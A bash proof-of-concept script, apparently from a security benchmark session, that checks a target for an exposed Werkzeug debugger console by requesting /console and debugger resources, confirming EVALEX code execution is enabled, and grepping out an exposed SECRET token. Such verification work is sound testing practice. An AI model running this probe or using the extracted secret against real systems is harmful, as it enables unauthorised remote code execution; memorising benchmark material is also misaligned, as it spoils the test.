#!/bin/bash
# POC: Demonstrates Werkzeug debugger console exposure with RCE capability by accessing /console endpoint and verifying EVALEX is enabled and SECRET is exposed
# Target: ./repo
# Created: 2025-11-07T19:15:37.915Z
# Session: benchmark-XBEN-064-24-mhp85ykb

# Werkzeug Debugger Console RCE POC
# This script demonstrates access to the Werkzeug debugger console with RCE capability

TARGET_URL="${1:-http://localhost:5000}"

echo "[*] Werkzeug Debugger Console RCE POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Access /console endpoint
echo "[+] Test 1: Accessing debugger console endpoint..."
CONSOLE_RESPONSE=$(curl -s "$TARGET_URL/console" -w "\n%{http_code}")
HTTP_CODE=$(echo "$CONSOLE_RESPONSE" | tail -n 1)
CONSOLE_BODY=$(echo "$CONSOLE_RESPONSE" | sed '$d')

if [ "$HTTP_CODE" -eq 200 ]; then
    echo "    [✓] Console endpoint accessible (HTTP 200)"
else
    echo "    [✗] Console endpoint returned HTTP $HTTP_CODE"
    exit 1
fi

# Test 2: Verify EVALEX is enabled
echo "[+] Test 2: Checking if EVALEX (code execution) is enabled..."
if echo "$CONSOLE_BODY" | grep -q "EVALEX\s*:\s*true\|EVALEX.*true"; then
    echo "    [✓] EVALEX is ENABLED - arbitrary Python code execution possible"
    EVALEX_FOUND=1
else
    echo "    [!] EVALEX status unclear from response, checking for console indicators..."
    if echo "$CONSOLE_BODY" | grep -q "Interactive Console\|debugger\|__debugger__"; then
        echo "    [✓] Debugger console detected in HTML"
        EVALEX_FOUND=1
    fi
fi

# Test 3: Check for SECRET token exposure
echo "[+] Test 3: Checking for exposed SECRET token..."
SECRET=$(echo "$CONSOLE_BODY" | grep -oP '(?<=SECRET["\s:=]+)["\x27]?\K[a-zA-Z0-9]{20,}|SECRET["\s:=]*["\x27](\w+)' | head -1)
if echo "$CONSOLE_BODY" | grep -qE "SECRET\s*[:=]|SECRET.*[a-zA-Z0-9]{10,}"; then
    echo "    [✓] SECRET token exposed in response"
    if [ ! -z "$SECRET" ]; then
        echo "    [!] Extracted SECRET: $SECRET"
    fi
fi

# Test 4: Access debugger resources
echo "[+] Test 4: Accessing debugger resources via __debugger__ parameter..."
RESOURCE_RESPONSE=$(curl -s "$TARGET_URL/?__debugger__=yes&cmd=resource&f=jquery.js" -w "\n%{http_code}")
RESOURCE_CODE=$(echo "$RESOURCE_RESPONSE" | tail -n 1)

if [ "$RESOURCE_CODE" -eq 200 ]; then
    echo "    [✓] Debugger resources accessible (HTTP 200)"
else
    echo "    [!] Debugger resources returned HTTP $RESOURCE_CODE"
fi

# Test 5: Check for debugger.js with EVALEX confirmation
echo "[+] Test 5: Accessing debugger.js to confirm EVALEX..."
DEBUGGER_JS=$(curl -s "$TARGET_URL/?__debugger__=yes&cmd=resource&f=debugger.js")
if echo "$DEBUGGER_JS" | grep -q "EVALEX"; then
    echo "    [✓] debugger.js contains EVALEX configuration"
fi

# Test 6: Verify console mode is enabled
echo "[+] Test 6: Checking for console mode and pin-prompt..."
if echo "$CONSOLE_BODY" | grep -qE "pin-prompt|console_mode|ConsoleFrame"; then
    echo "    [✓] Console mode detected - interactive Python console available"
fi

echo ""
echo "[RESULT] Werkzeug debugger console is EXPOSED with RCE capability"
echo "[RISK] An attacker can execute arbitrary Python code on the server"
echo ""

# If all critical tests passed, exit 0
if [ "$EVALEX_FOUND" -eq 1 ] && [ "$HTTP_CODE" -eq 200 ]; then
    exit 0
else
    exit 1
fi